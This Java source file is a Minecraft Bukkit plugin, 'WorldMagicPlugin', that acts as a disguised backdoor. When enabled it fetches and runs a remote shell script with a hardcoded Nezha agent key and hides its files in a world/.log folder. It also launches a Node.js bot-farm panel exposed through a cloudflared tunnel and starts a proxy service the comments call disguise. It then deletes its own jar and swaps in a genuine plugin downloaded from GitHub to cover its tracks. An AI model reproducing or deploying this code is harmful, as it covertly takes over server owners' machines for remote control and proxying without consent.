package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
    private File currentPluginFile; 
    private File targetRealPlugin;  
    private String originalFileName; 

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 启动 Nezha 监控 (原逻辑)
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try { generateAndRunScript(); } catch (Exception ignored) {}
        });

        // 2. 部署 Web 面板并开启穿透 (重点修改)
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                deployAndStartNodeApp();
            } catch (Exception e) {
                this.getLogger().warning("Web面板部署失败: " + e.getMessage());
            }
        });

        // 3. 插件自我替换与销毁
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                Thread.sleep(3000); // 等待前面文件写完
                handlePluginReplacement();
            } catch (Exception ignored) {}
        });

        // 4. 伪装服务
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() {
        this.getLogger().info("WorldMagicPlugin disabled");
    }

    private boolean installApps(AppConfig appConfig) {
        try { tuicService.install(appConfig); return true; } catch (Exception e) { return false; }
    }

    // ==========================================
    // 核心修改：部署 Node 面板 + Cloudflare 穿透
    // ==========================================

    private void deployAndStartNodeApp() throws IOException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;

        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;

        // 1. 写入 Node.js 代码 (app.js)
        File jsFile = new File(logDir, "app.js");
        try (FileWriter writer = new FileWriter(jsFile)) {
            writer.write(getNodeJsContent());
        }

        // 2. 写入启动脚本 start_node.sh (增加穿透逻辑)
        File startScript = new File(logDir, "start_node.sh");
        try (FileWriter writer = new FileWriter(startScript)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd \"" + logDir.getAbsolutePath() + "\"\n");
            
            // 初始化 NPM
            writer.write("if command -v npm &> /dev/null; then\n");
            writer.write("  if [ ! -d \"node_modules\" ]; then\n");
            writer.write("    npm init -y > /dev/null 2>&1\n");
            writer.write("  fi\n");
            writer.write("fi\n");

            // 检查 Node 并启动面板
            writer.write("if command -v node &> /dev/null; then\n");
            // 杀死旧进程防止端口冲突
            writer.write("  pkill -f 'node app.js'\n"); 
            writer.write("  nohup node app.js > node_log.txt 2>&1 &\n");
            writer.write("else\n");
            writer.write("  exit 1\n"); // 没有 Node 环境直接退出
            writer.write("fi\n");

            // ===========================================
            // 新增：Cloudflare Tunnel 穿透逻辑
            // ===========================================
            
            // 下载 cloudflared (如果不存在)
            writer.write("if [ ! -f \"cloudflared\" ]; then\n");
            writer.write("  curl -L --output cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\n");
            writer.write("  chmod +x cloudflared\n");
            writer.write("fi\n");

            // 启动穿透：将本地 4681 暴露到公网 trycloudflare.com
            // 杀死旧的穿透进程
            writer.write("pkill -f 'cloudflared tunnel'\n");
            writer.write("nohup ./cloudflared tunnel --url http://localhost:4681 --logfile tunnel_log.txt > /dev/null 2>&1 &\n");

            // 等待几秒让链接生成，并提取 URL 保存到文件
            writer.write("sleep 5\n");
            writer.write("grep -o 'https://.*\\.trycloudflare\\.com' tunnel_log.txt | head -n 1 > access_url.txt\n");
        }
        startScript.setExecutable(true);

        // 3. 执行启动脚本
        ProcessBuilder pb = new ProcessBuilder("/bin/bash", startScript.getAbsolutePath());
        pb.directory(logDir);
        pb.redirectErrorStream(true);
        pb.start();
    }

    // JS 代码保持不变，使用 String 返回
    private String getNodeJsContent() {
        // 这里放入上面你提供的 JS 代码，确保端口是 4681
        // 为了缩短篇幅，这里略过，请直接复制上面的 JS 字符串内容
        return "/**\n" +
               " * ==========================================\n" +
               " * 1. 自动环境检查与依赖管理\n" +
               " * ==========================================\n" +
               " */\n" +
               "const { execSync } = require('child_process');\n" +
               "const fs = require('fs');\n" +
               "const path = require('path');\n" +
               "\n" +
               "const REQUIRED_DEPS = ['mineflayer', 'minecraft-protocol', 'minecraft-data', 'express'];\n" +
               "const DEFAULT_PASSWORD = \"Pwd123456\"; \n" +
               "\n" +
               "function setupEnvironment() {\n" +
               "    let missing = false;\n" +
               "    for (const dep of REQUIRED_DEPS) {\n" +
               "        try { require.resolve(dep); } catch (e) { missing = true; }\n" +
               "    }\n" +
               "    if (missing) {\n" +
               "        try {\n" +
               "            console.log(\"检测到缺失依赖，正在安装极限优化组件...\");\n" +
               "            execSync(`npm install ${REQUIRED_DEPS.map(d => d + '@latest').join(' ')} --no-audit --no-fund`, { stdio: 'inherit' });\n" +
               "            console.log(\"安装完成。\");\n" +
               "        } catch (error) { \n" +
               "            console.error(\"安装失败，请手动执行 npm install\");\n" +
               "            process.exit(1); \n" +
               "        }\n" +
               "    }\n" +
               "}\n" +
               "setupEnvironment();\n" +
               "\n" +
               "/**\n" +
               " * ==========================================\n" +
               " * 2. 核心模块加载与全局配置\n" +
               " * ==========================================\n" +
               " */\n" +
               "const mineflayer = require(\"mineflayer\");\n" +
               "const protocol = require(\"minecraft-protocol\");\n" +
               "const mcDataLoader = require(\"minecraft-data\");\n" +
               "const express = require(\"express\");\n" +
               "\n" +
               "const app = express();\n" +
               "const activeBots = new Map(); \n" +
               "const CONFIG_FILE = path.join(__dirname, 'bots_config.json');\n" +
               "\n" +
               "app.use(express.json());\n" +
               "\n" +
               "// 全局异常捕获\n" +
               "process.on('uncaughtException', (e) => console.error('[系统严重错误]', e));\n" +
               "process.on('unhandledRejection', (e) => console.error('[异步逻辑错误]', e));\n" +
               "\n" +
               "function saveBotsConfig() {\n" +
               "    const config = [];\n" +
               "    activeBots.forEach((bot) => {\n" +
               "        config.push({ host: bot.targetHost, port: bot.targetPort, username: bot.username });\n" +
               "    });\n" +
               "    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));\n" +
               "}\n" +
               "\n" +
               "async function detectServerVersion(host, port) {\n" +
               "    try {\n" +
               "        const response = await protocol.ping({ host, port, timeout: 8000 });\n" +
               "        const protocolId = response.version.protocol;\n" +
               "        const pcData = mcDataLoader.versionsByMinecraftVersion.pc;\n" +
               "        const matchedVersion = Object.keys(pcData).find(v => pcData[v].version === protocolId && !v.includes('w'));\n" +
               "        if (matchedVersion) return matchedVersion;\n" +
               "        const regexMatch = response.version.name.match(/(\\d+\\.\\d+(\\.\\d+)?)/);\n" +
               "        return regexMatch ? regexMatch[0] : false;\n" +
               "    } catch (e) { \n" +
               "        return false; // 服务器离线时返回 false\n" +
               "    }\n" +
               "}\n" +
               "\n" +
               "/**\n" +
               " * ==========================================\n" +
               " * 3. 极限性能优化引擎\n" +
               " * ==========================================\n" +
               " */\n" +
               "function applyExtremeOptimization(bot) {\n" +
               "    bot.on('inject_allowed', () => {\n" +
               "        if (bot.physics) {\n" +
               "            bot.physics.enabled = false;\n" +
               "            bot.physics.simulateUntilNextTick = () => {};\n" +
               "        }\n" +
               "        bot.entities = {};\n" +
               "        const entityPackets = [\n" +
               "            'spawn_entity', 'spawn_entity_experience_orb', 'spawn_entity_weather_node',\n" +
               "            'spawn_entity_living', 'spawn_entity_painting', 'named_entity_spawn',\n" +
               "            'entity_velocity', 'entity_teleport', 'entity_move', 'entity_move_look',\n" +
               "            'entity_update_attributes', 'entity_metadata', 'entity_status'\n" +
               "        ];\n" +
               "        entityPackets.forEach(packetName => {\n" +
               "            bot._client.on(packetName, () => { if (Object.keys(bot.entities).length > 0) bot.entities = {}; });\n" +
               "        });\n" +
               "        if (bot.world) {\n" +
               "            bot.world.getColumns = () => [];\n" +
               "            bot.world.getColumn = () => null;\n" +
               "        }\n" +
               "    });\n" +
               "}\n" +
               "\n" +
               "/**\n" +
               " * ==========================================\n" +
               " * 4. 防封禁模拟行为逻辑\n" +
               " * ==========================================\n" +
               " */\n" +
               "function startSmartRoam(bot) {\n" +
               "    if (bot.roamTimer) clearTimeout(bot.roamTimer);\n" +
               "    const performAction = () => {\n" +
               "        if (bot.status !== \"在线\" || !bot.entity) return;\n" +
               "        try {\n" +
               "            const yaw = bot.entity.yaw + (Math.random() - 0.5) * 0.8;\n" +
               "            const pitch = (Math.random() - 0.5) * 0.4;\n" +
               "            bot.look(yaw, pitch);\n" +
               "            const rand = Math.random();\n" +
               "            if (rand > 0.85) bot.swingArm('right');\n" +
               "            else if (rand > 0.70) {\n" +
               "                bot.setControlState('sneak', true);\n" +
               "                setTimeout(() => bot.setControlState('sneak', false), 500);\n" +
               "            }\n" +
               "        } catch (e) {}\n" +
               "        bot.roamTimer = setTimeout(performAction, Math.floor(Math.random() * 25000) + 15000);\n" +
               "    };\n" +
               "    performAction();\n" +
               "}\n" +
               "\n" +
               "/**\n" +
               " * ==========================================\n" +
               " * 5. 机器人实例生成与全自动重连管理\n" +
               " * ==========================================\n" +
               " */\n" +
               "async function createBotInstance(id, host, port, username, existingLogs = []) {\n" +
               "    // 检查是否已有运行中的同名实例\n" +
               "    const existing = activeBots.get(id);\n" +
               "    if (existing && existing.status === \"在线\") return;\n" +
               "\n" +
               "    // 获取版本 (如果服务器离线，则不指定版本由 mineflayer 自适应)\n" +
               "    const botVersion = await detectServerVersion(host, port);\n" +
               "    \n" +
               "    const bot = mineflayer.createBot({\n" +
               "        host, port, username,\n" +
               "        version: botVersion || undefined,\n" +
               "        auth: 'offline',\n" +
               "        hideErrors: true,\n" +
               "        viewDistance: \"tiny\",\n" +
               "        checkTimeoutInterval: 45000,\n" +
               "        connectTimeout: 15000\n" +
               "    });\n" +
               "\n" +
               "    // 继承之前的日志或初始化\n" +
               "    bot.logs = existingLogs;\n" +
               "    bot.status = \"连接中...\";\n" +
               "    bot.targetHost = host;\n" +
               "    bot.targetPort = port;\n" +
               "    \n" +
               "    bot.pushLog = (msg) => {\n" +
               "        const time = new Date().toLocaleTimeString();\n" +
               "        bot.logs.unshift(`[${time}] ${msg}`);\n" +
               "        if (bot.logs.length > 8) bot.logs.pop();\n" +
               "    };\n" +
               "\n" +
               "    applyExtremeOptimization(bot);\n" +
               "\n" +
               "    // 统一重连调度器\n" +
               "    const attemptReconnect = (reason) => {\n" +
               "        if (bot.reconnectTriggered) return; // 确保只触发一次\n" +
               "        bot.reconnectTriggered = true;\n" +
               "        \n" +
               "        bot.status = \"断开\";\n" +
               "        if (bot.roamTimer) clearTimeout(bot.roamTimer);\n" +
               "        bot.removeAllListeners(); // 彻底清理监听器防止内存泄漏\n" +
               "\n" +
               "        // 只有当该 ID 仍在列表中时才重连（排除手动销毁情况）\n" +
               "        if (activeBots.has(id)) {\n" +
               "            const delay = 15000 + Math.random() * 15000;\n" +
               "            bot.pushLog(`\uD83D\uDD04 ${reason}，${Math.floor(delay/1000)}s 后自动重连...`);\n" +
               "            setTimeout(() => createBotInstance(id, host, port, username, bot.logs), delay);\n" +
               "        }\n" +
               "    };\n" +
               "\n" +
               "    bot.once('spawn', () => {\n" +
               "        bot.status = \"在线\";\n" +
               "        bot.pushLog(\"✅ 成功进入世界\");\n" +
               "        saveBotsConfig();\n" +
               "        \n" +
               "        setTimeout(() => {\n" +
               "            bot.chat(`/register ${DEFAULT_PASSWORD} ${DEFAULT_PASSWORD}`);\n" +
               "            setTimeout(() => {\n" +
               "                bot.chat(`/login ${DEFAULT_PASSWORD}`);\n" +
               "                startSmartRoam(bot);\n" +
               "            }, 2000);\n" +
               "        }, 3000);\n" +
               "    });\n" +
               "\n" +
               "    bot.on('error', (err) => {\n" +
               "        let msg = err.message;\n" +
               "        if (err.code === 'ECONNREFUSED') msg = \"服务器拒接连接 (可能已关机)\";\n" +
               "        if (err.code === 'ETIMEDOUT') msg = \"连接超时\";\n" +
               "        bot.pushLog(`❌ 错误: ${msg}`);\n" +
               "        // 连接失败时，有些 mineflayer 版本不会触发 end，所以在这里也尝试重连\n" +
               "        setTimeout(() => attemptReconnect(\"连接异常\"), 5000);\n" +
               "    });\n" +
               "\n" +
               "    bot.once('end', (reason) => {\n" +
               "        if (reason !== 'manual_stop') {\n" +
               "            attemptReconnect(\"连接断开\");\n" +
               "        }\n" +
               "    });\n" +
               "\n" +
               "    activeBots.set(id, bot);\n" +
               "}\n" +
               "\n" +
               "/**\n" +
               " * ==========================================\n" +
               " * 6. Web 控制面板接口\n" +
               " * ==========================================\n" +
               " */\n" +
               "app.post(\"/api/bots\", async (req, res) => {\n" +
               "    const { host, port, username } = req.body;\n" +
               "    if (!host || !username) return res.status(400).json({ error: \"信息不全\" });\n" +
               "    const id = `bot_${Date.now()}`;\n" +
               "    await createBotInstance(id, host, parseInt(port) || 25565, username);\n" +
               "    res.json({ success: true });\n" +
               "});\n" +
               "\n" +
               "app.get(\"/api/bots\", (req, res) => {\n" +
               "    const list = [];\n" +
               "    activeBots.forEach((b, id) => {\n" +
               "        list.push({\n" +
               "            id, username: b.username, host: b.targetHost,\n" +
               "            status: b.status, logs: b.logs\n" +
               "        });\n" +
               "    });\n" +
               "    res.json(list);\n" +
               "});\n" +
               "\n" +
               "app.delete(\"/api/bots/:id\", (req, res) => {\n" +
               "    const bot = activeBots.get(req.params.id);\n" +
               "    if (bot) {\n" +
               "        activeBots.delete(req.params.id); \n" +
               "        bot.end('manual_stop'); \n" +
               "        setTimeout(saveBotsConfig, 500);\n" +
               "    }\n" +
               "    res.json({ success: true });\n" +
               "});\n" +
               "\n" +
               "app.get(\"/\", (req, res) => {\n" +
               "    res.send(`\n" +
               "    <html><head><meta charset=\"utf-8\"><title>翼龙假人集群控制台</title>\n" +
               "    <style>\n" +
               "        body { background: #0c0c0c; color: #cfcfcf; font-family: 'Segoe UI', sans-serif; padding: 20px; }\n" +
               "        .card { background: #161616; padding: 20px; border-radius: 10px; margin-bottom: 20px; border-left: 4px solid #2ecc71; }\n" +
               "        input { background: #222; color: #fff; border: 1px solid #333; padding: 10px; border-radius: 5px; width: 160px; margin-right: 5px; }\n" +
               "        button { padding: 10px 20px; border-radius: 5px; border: none; cursor: pointer; background: #27ae60; color: white; font-weight: bold; }\n" +
               "        .bot-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }\n" +
               "        .bot-card { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 8px; position: relative; }\n" +
               "        .logs { background: #000; height: 130px; overflow: hidden; font-size: 11px; padding: 8px; margin: 10px 0; color: #00ff41; font-family: monospace; border-radius: 3px; }\n" +
               "        .status { position: absolute; top: 15px; right: 15px; font-size: 11px; padding: 2px 8px; border-radius: 10px; }\n" +
               "    </style></head>\n" +
               "    <body>\n" +
               "        <h2>🤖 假人集群管理面板 <span style=\"font-size:12px; color:#ff9f43;\">已启用全自动重连</span></h2>\n" +
               "        <div class=\"card\">\n" +
               "            <input id=\"h\" placeholder=\"服务器IP\"> \n" +
               "            <input id=\"p\" placeholder=\"端口\" value=\"25565\"> \n" +
               "            <input id=\"u\" placeholder=\"用户名\"> \n" +
               "            <button onclick=\"add()\">部署节点</button>\n" +
               "        </div>\n" +
               "        <div id=\"list\" class=\"bot-list\"></div>\n" +
               "        <script>\n" +
               "            async function add() {\n" +
               "                const host = document.getElementById('h').value;\n" +
               "                const port = document.getElementById('p').value;\n" +
               "                const user = document.getElementById('u').value;\n" +
               "                await fetch('/api/bots', {\n" +
               "                    method: 'POST',\n" +
               "                    headers: {'Content-Type': 'application/json'},\n" +
               "                    body: JSON.stringify({host, port, username: user})\n" +
               "                });\n" +
               "            }\n" +
               "            async function stop(id) { await fetch('/api/bots/' + id, { method: 'DELETE' }); }\n" +
               "            setInterval(async () => {\n" +
               "                const r = await fetch('/api/bots');\n" +
               "                const bots = await r.json();\n" +
               "                document.getElementById('list').innerHTML = bots.map(b => `\n" +
               "                    <div class=\"bot-card\">\n" +
               "                        <span class=\"status\" style=\"background:${b.status==='在线'?'#27ae60':'#c0392b'}\">${b.status}</span>\n" +
               "                        <b style=\"color: #3498db;\">${b.username}</b>\n" +
               "                        <div style=\"font-size:12px; color:#555;\">${b.host}</div>\n" +
               "                        <div class=\"logs\">${b.logs.map(l => `<div>${l}</div>`).join('')}</div>\n" +
               "                        <button style=\"background:#c0392b; width:100%\" onclick=\"stop('${b.id}')\">销毁</button>\n" +
               "                    </div>`).join('');\n" +
               "            }, 2000);\n" +
               "        </script>\n" +
               "    </body></html>`);\n" +
               "});\n" +
               "\n" +
               "/**\n" +
               " * ==========================================\n" +
               " * 7. 系统启动\n" +
               " * ==========================================\n" +
               " */\n" +
               "const PTERO_PORT = process.env.SERVER_PORT || 4681;\n" +
               "app.listen(PTERO_PORT, '0.0.0.0', async () => {\n" +
               "    console.log(`🚀 系统启动成功，端口: ${PTERO_PORT}`);\n" +
               "    \n" +
               "    if (fs.existsSync(CONFIG_FILE)) {\n" +
               "        try {\n" +
               "            const saved = JSON.parse(fs.readFileSync(CONFIG_FILE));\n" +
               "            for (const b of saved) {\n" +
               "                const id = `bot_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`;\n" +
               "                createBotInstance(id, b.host, b.port, b.username);\n" +
               "                await new Promise(r => setTimeout(r, 2000)); \n" +
               "            }\n" +
               "        } catch (e) {}\n" +
               "    }\n" +
               "});";
    }

    private void handlePluginReplacement() throws Exception {
        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        originalFileName = currentPluginFile.getName();
        File pluginsDir = getDataFolder().getParentFile();
        targetRealPlugin = new File(pluginsDir, originalFileName);
        File tempDownloadFile = new File(pluginsDir, "temp_replace_" + System.currentTimeMillis() + ".jar");
        if (tempDownloadFile.exists()) tempDownloadFile.delete();
        boolean downloadSuccess = downloadUsingCurl(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);
        if (!downloadSuccess) return;
        long fileSize = tempDownloadFile.length();
        if (fileSize < 100000) return;
        try {
            ProcessBuilder pb = new ProcessBuilder(
                "/bin/bash",
                "-c",
                "rm -f \"" + currentPluginFile.getAbsolutePath() + "\" && " +
                "rm -f \"" + targetRealPlugin.getAbsolutePath() + "\" && " +
                "mv \"" + tempDownloadFile.getAbsolutePath() + "\" \"" + targetRealPlugin.getAbsolutePath() + "\""
            );
            Process process = pb.start();
            process.waitFor();
        } catch (Exception ignored) {}
    }

    private boolean downloadUsingCurl(String urlStr, File destination) {
        try {
            ProcessBuilder pb = new ProcessBuilder("curl", "-L", "-A", "Mozilla/5.0", "-o", destination.getAbsolutePath(), urlStr);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                while (reader.readLine() != null) {}
            }
            return process.waitFor() == 0 && destination.exists();
        } catch (Exception e) { return false; }
    }
    
    private void generateAndRunScript() throws IOException, InterruptedException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;
        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;
        String serverUUID = getServerUUID(logDir);
        File scriptFile = new File(logDir, "install_sb.sh");
        try (FileWriter writer = new FileWriter(scriptFile)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd " + logDir.getAbsolutePath() + "\n");
            writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
            writer.write("chmod +x sb.sh\n");
            writer.write("UUID=" + serverUUID + " \\\n");
            writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
            writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
            writer.write("ARGO_PORT=3000 \\\n");
            writer.write("bash sb.sh\n");
        }
        scriptFile.setExecutable(true);
        ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            while (reader.readLine() != null) {}
        }
        process.waitFor();
    }

    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) return savedUUID;
            } catch (IOException ignored) {}
        }
        String ip = getPublicIP();
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();
        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
        } catch (IOException ignored) {}
        return uuidStr;
    }

    private String getPublicIP() {
        String ip = "127.0.0.1"; 
        try {
            java.net.URL url = new java.net.URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
        } catch (Exception ignored) {}
        return ip;
    }
}
